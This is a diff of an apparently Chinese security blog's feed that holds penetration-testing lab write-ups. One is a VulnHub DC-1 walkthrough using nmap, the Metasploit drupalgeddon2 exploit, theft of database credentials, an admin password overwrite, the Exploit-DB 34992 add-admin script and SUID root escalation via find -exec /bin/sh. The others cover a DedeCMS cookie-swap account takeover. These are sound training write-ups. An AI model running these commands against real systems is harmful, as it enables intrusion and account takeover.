-&lt;img data-src=&#34;https://tva3.sinaimg.cn/large/007dFS7lly8h3yn4ubfxcj30cg04dglq.jpg&#34; alt=&#34;&#34;&gt;&lt;br&gt;
-注册失败了，用户名不够长，那就注册一个 00001 进行尝试&lt;br&gt;
-&lt;img data-src=&#34;https://tva2.sinaimg.cn/large/007dFS7lly8h3yn5hmnsgj31hc0u07bj.jpg&#34; alt=&#34;&#34;&gt;&lt;br&gt;
-登录抓包，用 vid 替换 userid 的值，vid_ckMd5 替换 userid_ckMd5 的值&lt;br&gt;
-成功登录管理员账户&lt;br&gt;
-&lt;img data-src=&#34;https://tva3.sinaimg.cn/large/007dFS7lly8h3yn5somwzj30qq0fv767.jpg&#34; alt=&#34;&#34;&gt;&lt;br&gt;
- F12 查看 cookie，修改 DedeUserID 和 DedeUserID__ckMd5 的值，与 vid 对应&lt;br&gt;
-&lt;img data-src=&#34;https://tva1.sinaimg.cn/large/007dFS7lly8h3yn6ha50sj30r30a7myf.jpg&#34; alt=&#34;&#34;&gt;&lt;br&gt;
-返回网站首页，这时登录页面也变成了管理员账户，至此完成越权&lt;/p&gt;
-</content>
-        <category term="渗透" />
-        <category term="Web" />
-        <updated>2022-07-06T11:41:29.000Z</updated>
     </entry>
     <entry>
         <id>http://meviv.github.io/2022/06/20/%E6%9D%82%E8%B0%88/%E9%9B%9C%E8%A9%A9%E4%BA%8C/</id>
@@ -301,67 +226,66 @@ Done 表示脚本执行完成，打开靶机发现计算器已弹出&lt;br&gt;
 &lt;h1 id=&#34;靶机下载&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#靶机下载&#34;&gt;#&lt;/a&gt; 靶机下载&lt;/h1&gt;
 &lt;p&gt;下载地址为 https://download.vulnhub.com/dc/DC-1.zip&lt;br&gt;
  可在 https://download.vulnhub.com 查看相关下载&lt;br&gt;
-攻击机为 kali2022&lt;br&gt;
- 两机均用 nat 连接&lt;/p&gt;
+攻击机为 kali2022 (版本忘了)&lt;/p&gt;
 &lt;h1 id=&#34;渗透过程&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#渗透过程&#34;&gt;#&lt;/a&gt; 渗透过程&lt;/h1&gt;
 &lt;h2 id=&#34;flag1&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#flag1&#34;&gt;#&lt;/a&gt; flag1&lt;/h2&gt;
 &lt;p&gt;打开 kali 扫描靶机&lt;/p&gt;
-&lt;figure class=&#34;highlight raw&#34;&gt;&lt;figcaption data-lang=&#34;&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;arp-scan -l&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://tva4.sinaimg.cn/large/007dFS7lly8h7r6tgjanfj30kb054dh3.jpg&#34; alt=&#34;&#34;&gt;&lt;br&gt;
+&lt;figure class=&#34;highlight raw&#34;&gt;&lt;figcaption data-lang=&#34;&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;arp-scan -l&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2024/03/03/YSRZQv76aM4heyD.png&#34; alt=&#34;&#34;&gt;&lt;br&gt;
 也可以使用 nmap 扫描 (此处请根据实际修改 IP)&lt;/p&gt;
-&lt;figure class=&#34;highlight raw&#34;&gt;&lt;figcaption data-lang=&#34;&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;ifconfig&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;nmap -sP 192.168.232.0&amp;#x2F;24&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://tva1.sinaimg.cn/large/007dFS7lly8h7r6tnpodaj30hz0hrwi3.jpg&#34; alt=&#34;&#34;&gt;&lt;br&gt;
+&lt;figure class=&#34;highlight raw&#34;&gt;&lt;figcaption data-lang=&#34;&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;ifconfig&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;nmap -sP 192.168.232.0&amp;#x2F;24&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2024/03/03/mnOLTq2S1xCc9fv.png&#34; alt=&#34;&#34;&gt;&lt;br&gt;
 发现目标主机后扫描开放端口&lt;/p&gt;
-&lt;figure class=&#34;highlight raw&#34;&gt;&lt;figcaption data-lang=&#34;&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;nmap -sV -A 192.168.232.133&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://tva2.sinaimg.cn/large/007dFS7lly8h7r6tq4q65j30n00leq8f.jpg&#34; alt=&#34;&#34;&gt;&lt;br&gt;
-发现开启了 80 端口，访问 ip 查看页面信息&lt;br&gt;
-&lt;img data-src=&#34;https://tva4.sinaimg.cn/large/007dFS7lly8h7r6urp8tyj313q0fqq54.jpg&#34; alt=&#34;&#34;&gt;&lt;br&gt;
+&lt;figure class=&#34;highlight raw&#34;&gt;&lt;figcaption data-lang=&#34;&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;nmap -sV -A 192.168.232.133&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2024/03/03/NpBLxWrjmJ2KTvf.png&#34; alt=&#34;&#34;&gt;&lt;br&gt;
+发现开启了 80 端口，访问查看页面信息&lt;br&gt;
+&lt;img data-src=&#34;https://s2.loli.net/2024/03/03/DhjOsZmay5Uior1.png&#34; alt=&#34;&#34;&gt;&lt;br&gt;
 通过 Wappalyzer 发现网站 CMS 为 Drupal&lt;br&gt;
  使用 msf 进行渗透&lt;/p&gt;
-&lt;figure class=&#34;highlight raw&#34;&gt;&lt;figcaption data-lang=&#34;&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;msfconsole&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;search Drupal&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://tva2.sinaimg.cn/large/007dFS7lly8h7r6vde7ujj30v108atbb.jpg&#34; alt=&#34;&#34;&gt;&lt;br&gt;
+&lt;figure class=&#34;highlight raw&#34;&gt;&lt;figcaption data-lang=&#34;&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;msfconsole&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;search Drupal&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2024/03/03/2NDkmv9Ff4JC83s.png&#34; alt=&#34;&#34;&gt;&lt;br&gt;
 用较新的漏洞进行尝试&lt;/p&gt;
-&lt;figure class=&#34;highlight raw&#34;&gt;&lt;figcaption data-lang=&#34;&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;use exploit&amp;#x2F;unix&amp;#x2F;webapp&amp;#x2F;drupal_druopalgeddon2&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;show options&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;set RHOSTS 192.168.232.131&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;run&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://tva3.sinaimg.cn/large/007dFS7lly8h7r70q4gx2j30v80gadiu.jpg&#34; alt=&#34;&#34;&gt;&lt;br&gt;
+&lt;figure class=&#34;highlight raw&#34;&gt;&lt;figcaption data-lang=&#34;&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;use exploit&amp;#x2F;unix&amp;#x2F;webapp&amp;#x2F;drupal_druopalgeddon2&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;show options&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;set RHOSTS 192.168.232.131&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;run&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2024/03/03/FVwaOlKpsXeqNxr.png&#34; alt=&#34;&#34;&gt;&lt;br&gt;
 成功得到 shell，使用 py 得到交互 shell&lt;/p&gt;
 &lt;figure class=&#34;highlight raw&#34;&gt;&lt;figcaption data-lang=&#34;&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;shell&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;python -c &amp;#39;import pty; pty.spawn(&amp;quot;&amp;#x2F;bin&amp;#x2F;bash&amp;quot;)&amp;#39;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;查看文件目录发现第一个 flag 执行 cat 命令查看内容&lt;br&gt;
-&lt;img data-src=&#34;https://tva2.sinaimg.cn/large/007dFS7lly8h7r6vtw46ij30gp06cdh3.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;img data-src=&#34;https://s2.loli.net/2024/03/03/b2nfOFo7erZ3R1g.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;h2 id=&#34;flag2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#flag2&#34;&gt;#&lt;/a&gt; flag2&lt;/h2&gt;
 &lt;p&gt;该 flag 提示查找 Drupal 框架配置文件&lt;/p&gt;
 &lt;div class=&#34;note info&#34;&gt;
 &lt;p&gt;Drupal 默认数据库配置连接–&amp;gt;/sites/default/settings.php&lt;/p&gt;
 &lt;/div&gt;
 &lt;p&gt;直接 cd 到该目录下查看&lt;/p&gt;
-&lt;figure class=&#34;highlight raw&#34;&gt;&lt;figcaption data-lang=&#34;&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;cd &amp;#x2F;var&amp;#x2F;www&amp;#x2F;sites&amp;#x2F;default&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;ls&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;cat settings.php&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://tva2.sinaimg.cn/large/007dFS7lly8h7r6w11qo6j30cp0ay752.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight raw&#34;&gt;&lt;figcaption data-lang=&#34;&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;cd &amp;#x2F;var&amp;#x2F;www&amp;#x2F;sites&amp;#x2F;default&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;ls&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;cat settings.php&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2024/03/03/TeFQhtoHcvd7LKn.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;h2 id=&#34;flag3&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#flag3&#34;&gt;#&lt;/a&gt; flag3&lt;/h2&gt;
 &lt;p&gt;在 flag2 里发现了数据库用户和密码，连接一手&lt;/p&gt;
 &lt;figure class=&#34;highlight raw&#34;&gt;&lt;figcaption data-lang=&#34;&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;mysql -udbuser -pR0ck3t&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;select * from users 查询得 admin 账户&lt;br&gt;
-&lt;img data-src=&#34;https://tva4.sinaimg.cn/large/007dFS7lly8h7r6wbj2g6j30kv07vq43.jpg&#34; alt=&#34;&#34;&gt;&lt;br&gt;
+&lt;img data-src=&#34;https://s2.loli.net/2024/03/03/azoZ2lUg6cP9DM7.png&#34; alt=&#34;&#34;&gt;&lt;br&gt;
 由于得到的密码是密文，无法直接登录，这里有两种方法解决&lt;br&gt;
 方法一：更改账户密码&lt;br&gt;
 使用 Drupal 对数据库的加密方法，加密脚本位置在网站根目录下的 scripts 下&lt;br&gt;
 回到 /var/www 路径下，运行这个 password-hash.sh 加密脚本，得到新密码&lt;/p&gt;
-&lt;figure class=&#34;highlight raw&#34;&gt;&lt;figcaption data-lang=&#34;&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;cd &amp;#x2F;var&amp;#x2F;www&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;php scripts&amp;#x2F;password-hash.sh 114514&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://tva3.sinaimg.cn/large/007dFS7lly8h7r6wdpvp6j30l9021aac.jpg&#34; alt=&#34;&#34;&gt;&lt;br&gt;
-将密文更改密码 (此处建议恶补 sql 语句)&lt;/p&gt;
-&lt;figure class=&#34;highlight raw&#34;&gt;&lt;figcaption data-lang=&#34;&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;update users set pass&amp;#x3D;&amp;#39;$S$Db1FwryLsYBPfvEpR870QjGzJfPi64teqeVZrAZyjMh7HND&amp;#x2F;Ca4q&amp;#39; where uid&amp;#x3D;1;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://tva2.sinaimg.cn/large/007dFS7lly8h7r6wgbk4yj30mf01yaai.jpg&#34; alt=&#34;&#34;&gt;&lt;br&gt;
+&lt;figure class=&#34;highlight raw&#34;&gt;&lt;figcaption data-lang=&#34;&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;cd &amp;#x2F;var&amp;#x2F;www&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;php scripts&amp;#x2F;password-hash.sh 114514&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2024/03/03/iUQAG97hIzroEu5.png&#34; alt=&#34;&#34;&gt;&lt;br&gt;
+将密文更改密码 (此处需要临时抱佛脚回忆一下 sql 语句)&lt;/p&gt;
+&lt;figure class=&#34;highlight raw&#34;&gt;&lt;figcaption data-lang=&#34;&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;update users set pass&amp;#x3D;&amp;#39;$S$Db1FwryLsYBPfvEpR870QjGzJfPi64teqeVZrAZyjMh7HND&amp;#x2F;Ca4q&amp;#39; where uid&amp;#x3D;1;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2024/03/03/3JYMq2bOx9gcZis.png&#34; alt=&#34;&#34;&gt;&lt;br&gt;
 回到靶机 80 端口开放的页面进行登录，&lt;br&gt;
 在 Dashboard 得到第三个 flag&lt;br&gt;
 Special PERMS will help FIND the passwd - but you’ll need to -exec that command to work out how to get what’s in the shadow.&lt;br&gt;
-&lt;img data-src=&#34;https://tva1.sinaimg.cn/large/007dFS7lly8h7r6wibgldj30u10enmyq.jpg&#34; alt=&#34;&#34;&gt;&lt;br&gt;
-&lt;img data-src=&#34;https://tva3.sinaimg.cn/large/007dFS7lly8h7r6wl7u4oj30ji04idfy.jpg&#34; alt=&#34;&#34;&gt;&lt;br&gt;
+&lt;img data-src=&#34;https://s2.loli.net/2024/03/03/o6USICZFxbweqju.png&#34; alt=&#34;&#34;&gt;&lt;br&gt;
+&lt;img data-src=&#34;https://s2.loli.net/2024/03/03/txkJg1VudXMSGcR.png&#34; alt=&#34;&#34;&gt;&lt;br&gt;
  方法二：利用漏洞添加账户&lt;/p&gt;
 &lt;div class=&#34;note info&#34;&gt;
 &lt;p&gt;SearchSploit 是一个用于搜索 Exploit-DB 漏洞数据的命令行工具，它可以允许你离线 Exploit 数据库，这样你就可以在本地执行离线搜索，这对于有时候不能联网的渗透工作非常的有用。&lt;/p&gt;
 &lt;/div&gt;
 &lt;p&gt;之前使用 Wappalyzer 知道 drupal 版本为 7.2&lt;br&gt;
  利用 searchsploit 进行攻击&lt;/p&gt;
-&lt;figure class=&#34;highlight raw&#34;&gt;&lt;figcaption data-lang=&#34;&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;searchsploit drupal&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;python &amp;#x2F;usr&amp;#x2F;share&amp;#x2F;exploitdb&amp;#x2F;exploits&amp;#x2F;php&amp;#x2F;webapps&amp;#x2F;34992.py -t http:&amp;#x2F;&amp;#x2F;192.168.232.133 -u admin2 -p 114514&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://tva1.sinaimg.cn/large/007dFS7lly8h7rwps4awpj30q60lstbk.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight raw&#34;&gt;&lt;figcaption data-lang=&#34;&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;searchsploit drupal&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;python &amp;#x2F;usr&amp;#x2F;share&amp;#x2F;exploitdb&amp;#x2F;exploits&amp;#x2F;php&amp;#x2F;webapps&amp;#x2F;34992.py -t http:&amp;#x2F;&amp;#x2F;192.168.232.133 -u admin2 -p 114514&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2024/03/03/lkpJHOr4ySnUVxW.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;div class=&#34;note info&#34;&gt;
 &lt;p&gt;这里使用 py2 的原因是 py2 对于 print 的使用不严&lt;br&gt;
 如果在使用以上命令有报错可以尝试声明 python2&lt;/p&gt;
 &lt;/div&gt;
 &lt;p&gt;重新登录一下 mysql 查看，发现用户已经添加了&lt;br&gt;
-&lt;img data-src=&#34;https://tva1.sinaimg.cn/large/007dFS7lly8h7rwqh9q6vj30h206yjsm.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;img data-src=&#34;https://s2.loli.net/2024/03/03/X2jEkCfZrtv3Jdn.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;h2 id=&#34;flag4&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#flag4&#34;&gt;#&lt;/a&gt; flag4&lt;/h2&gt;
 &lt;p&gt;flag 的提示词是 passwd、-exec、shadow，看一下 /etc/passwd, 发现 flag4&lt;br&gt;
  看一下 /home/flag4 的文件，尝试 cat flag4/flag4.txt，拿到 flag4，发现提示我们将权限提升到 root&lt;br&gt;
-&lt;img data-src=&#34;https://tva2.sinaimg.cn/large/007dFS7lly8h7rwqlc992j30gx0c3q63.jpg&#34; alt=&#34;&#34;&gt;&lt;br&gt;
-&lt;img data-src=&#34;https://tva3.sinaimg.cn/large/007dFS7lly8h7rwt9jsdqj30ep02emxd.jpg&#34; alt=&#34;&#34;&gt;&lt;br&gt;
+&lt;img data-src=&#34;https://s2.loli.net/2024/03/03/9Q1wlvz7PDWx2rm.png&#34; alt=&#34;&#34;&gt;&lt;br&gt;
+&lt;img data-src=&#34;https://s2.loli.net/2024/03/03/pYgNjl3UWxhn5df.png&#34; alt=&#34;&#34;&gt;&lt;br&gt;
  根据提示把权限提升至 root, 进行 SUID 提权&lt;/p&gt;
 &lt;div class=&#34;note info&#34;&gt;
 &lt;p&gt;什么是 suid？suid 全称是 Set owner User ID up on execution。这是 Linux 给可执行文件的一个属性。通俗的理解为其他用户执行这个程序的时候可以用该程序所有者 / 组的权限。需要注意的是，只有程序的所有者是 0 号或其他 super user，同时拥有 suid 权限，才可以提权。&lt;br&gt;
@@ -379,12 +303,12 @@ Probably. But perhaps it’s not that easy.  Or maybe it is?&lt;br&gt;
 可能。但也许不是那么容易。或许是这样？&lt;/p&gt;
 &lt;h2 id=&#34;flag5&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#flag5&#34;&gt;#&lt;/a&gt; flag5&lt;/h2&gt;
 &lt;p&gt;首先找一下有 SUID 权限的文件&lt;/p&gt;
-&lt;figure class=&#34;highlight raw&#34;&gt;&lt;figcaption data-lang=&#34;&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;find &amp;#x2F; -perm -4000&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://tva4.sinaimg.cn/large/007dFS7lly8h7rwqxsio0j30ev0b7403.jpg&#34; alt=&#34;&#34;&gt;&lt;br&gt;
+&lt;figure class=&#34;highlight raw&#34;&gt;&lt;figcaption data-lang=&#34;&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;find &amp;#x2F; -perm -4000&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2024/03/03/y8oJPU59xznef6V.png&#34; alt=&#34;&#34;&gt;&lt;br&gt;
 看到 find 命令有 SUID 权限，所以这里可以利用 find 命令进行提权&lt;br&gt;
 用 find 命令包含的 - exec 参数进行提权&lt;/p&gt;
 &lt;figure class=&#34;highlight raw&#34;&gt;&lt;figcaption data-lang=&#34;&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;find &amp;#x2F;var&amp;#x2F;www -exec &amp;quot;&amp;#x2F;bin&amp;#x2F;sh&amp;quot; \;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;这个命令中的 /bin/sh 是 linux 内核和用户之间的命令解释器，由此完成提权&lt;br&gt;
 得到最后一个 flag&lt;br&gt;
-&lt;img data-src=&#34;https://tva1.sinaimg.cn/large/007dFS7lly8h7rwr3veq8j30gn0aawg2.jpg&#34; alt=&#34;&#34;&gt;&lt;br&gt;
+&lt;img data-src=&#34;https://s2.loli.net/2024/03/03/KlME2RiFVIYzQsL.png&#34; alt=&#34;&#34;&gt;&lt;br&gt;
 thefinalflag:&lt;br&gt;
 Well done!!!&lt;br&gt;
 Hopefully you’ve enjoyed this and learned some new skills.&lt;br&gt;
@@ -398,5 +322,80 @@ by contacting me via Twitter - @DCAU7&lt;br&gt;
 </content>
         <category term="渗透" />
         <updated>2022-03-06T11:41:29.000Z</updated>
+    </entry>
+    <entry>
+        <id>http://meviv.github.io/2021/11/08/%E6%B8%97%E9%80%8F/dedecms02/</id>
+        <title>织梦系统渗透测试贰</title>
+        <link rel="alternate" href="http://meviv.github.io/2021/11/08/%E6%B8%97%E9%80%8F/dedecms02/"/>
+        <content type="html">&lt;p&gt;写的依托…&lt;/p&gt;
+&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;
+&lt;h1 id=&#34;工具&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#工具&#34;&gt;#&lt;/a&gt; 工具&lt;/h1&gt;
+&lt;p&gt;Burpsuite&lt;/p&gt;
+&lt;h1 id=&#34;过程&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程&#34;&gt;#&lt;/a&gt; 过程&lt;/h1&gt;
+&lt;p&gt;前面登录管理员账户后，还没有成功登录网站后台，所以继续进行尝试&lt;br&gt;
+想要登录网站后台光靠 cookie 是不行的，得有正经的密码&lt;br&gt;
+原来的思路是修改密码时抓包&lt;br&gt;
+但是修改密码必须提供原密码，尝试几次后放弃了，还是尝试忘记密码重置&lt;br&gt;
+通过几次抓包都没有有用信息，Forward 后就返回了，&lt;br&gt;
+得设置个安全问题才能继续，最后用无安全问题进入重置&lt;br&gt;
+&lt;img data-src=&#34;https://s2.loli.net/2024/03/03/ZkhOqrm8sbtJwMW.png&#34; alt=&#34;&#34;&gt;&lt;br&gt;
+抓包，发到 repeater&lt;br&gt;
+&lt;img data-src=&#34;https://s2.loli.net/2024/03/03/F7z5HyL3Wp4kVuU.png&#34; alt=&#34;&#34;&gt;&lt;br&gt;
